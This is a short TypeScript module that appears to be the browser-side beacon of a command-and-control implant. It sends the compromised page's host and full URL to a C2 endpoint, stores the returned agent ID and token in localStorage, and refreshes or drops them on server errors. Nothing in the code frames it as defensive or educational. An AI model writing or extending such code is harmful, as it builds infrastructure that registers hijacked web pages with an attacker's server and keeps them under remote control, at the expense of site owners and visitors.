import Axios, { AxiosError, AxiosResponse } from "axios";
import { AGENT_ID_KEY, C2_API_ENDPOINT, TOKEN_KEY } from "./consts";

export const getAgentIdAndToken = async () => {
  try {
    const res: AxiosResponse<{ agentId: string; token: string }> =
      await Axios.post(C2_API_ENDPOINT, {
        domain: window.location.host,
        url: window.location.href,
      });
    localStorage.setItem(AGENT_ID_KEY, res.data.agentId);
    localStorage.setItem(TOKEN_KEY, res.data.token);
  } catch (e) {
    console.error(e);
  }
};

export const getToken = async (agentId: string) => {
  try {
    const res: AxiosResponse<{ token: string }> = await Axios.post(
      `${C2_API_ENDPOINT}/token`,
      {
        agentId,
      }
    );
    localStorage.setItem(TOKEN_KEY, res.data.token);
  } catch (e) {
    if (
      e instanceof AxiosError &&
      e.response &&
      e.response.data.error &&
      e.response.data.error === "agent not found"
    ) {
      localStorage.removeItem(AGENT_ID_KEY);
      throw e;
    }
    console.error(e);
  }
};
